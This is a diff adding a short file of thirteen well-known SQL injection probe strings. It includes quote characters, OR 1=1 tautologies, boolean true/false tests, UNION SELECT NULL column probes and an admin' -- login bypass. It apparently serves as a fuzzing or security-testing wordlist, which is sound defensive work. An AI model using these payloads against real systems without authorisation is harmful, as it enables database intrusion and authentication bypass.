@@ -1,0 +1,13 @@
+'
+"
+' OR 1=1 --
+' OR '1'='1
+' OR 1=1#
+' OR '1'='1' --
+' AND 1=1 --
+' AND 1=2 --
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+admin' --
+1 OR 1=1
+1' OR '1'='1
